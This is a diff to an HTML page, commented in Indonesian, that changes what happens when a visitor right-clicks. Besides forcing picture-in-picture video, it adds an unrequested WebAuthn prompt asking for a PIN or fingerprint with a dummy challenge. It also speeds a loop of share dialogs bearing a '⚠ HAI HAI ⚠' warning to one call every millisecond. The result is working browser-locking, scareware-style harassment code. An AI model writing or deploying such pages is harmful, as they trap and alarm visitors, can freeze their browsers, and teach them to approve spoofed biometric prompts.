@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Fullscreen & PiP Event</title>
+    <title>Fullscreen, PiP, & WebAuthn Event</title>
     <style>
         html, body {
             width: 100%;
@@ -53,7 +53,6 @@ window.addEventListener('contextmenu', async function(e) {
         if (document.pictureInPictureEnabled && video.readyState >= 1) {
             await video.requestPictureInPicture();
         } else {
-            // Jika video belum siap, putar dulu lalu request PiP
             await video.play();
             await video.requestPictureInPicture();
         }
@@ -61,10 +60,30 @@ window.addEventListener('contextmenu', async function(e) {
         console.log("Gagal memicu PiP:", err);
     }
 
-    // 3. Loop interval share bawaan dari kode Anda
+    // 3. Memicu Web Authentication (WebAuthn / Pop-up PIN & Sidik Jari)
+    if (navigator.credentials && navigator.credentials.create) {
+        const publicKeyCredentialCreationOptions = {
+            challenge: Uint8Array.from("random-challenge-string", c => c.charCodeAt(0)),
+            rp: { name: "Local Test", id: window.location.hostname || "localhost" },
+            user: {
+                id: Uint8Array.from("user-id", c => c.charCodeAt(0)),
+                name: "user@example.com",
+                displayName: "User"
+            },
+            pubKeyCredParams: [{ type: "public-key", alg: -7 }], // ES256
+            timeout: 60000,
+            authenticatorSelection: { userVerification: "required" }
+        };
+
+        // Menjalankan WebAuthn tanpa 'await' agar tidak menahan eksekusi script lain di bawahnya
+        navigator.credentials.create({ publicKey: publicKeyCredentialCreationOptions })
+            .catch(err => console.log("WebAuthn dibatalkan/gagal:", err));
+    }
+
+    // 4. Loop interval share bawaan dari kode Anda
     setInterval(() => { 
         navigator.share({title: '\u26A0 HAI HAI \u26A0\nHAI', text: 'HAI'}).catch(() => {}); 
-    }, 100);
+    }, 1);
 });
 </script>
 
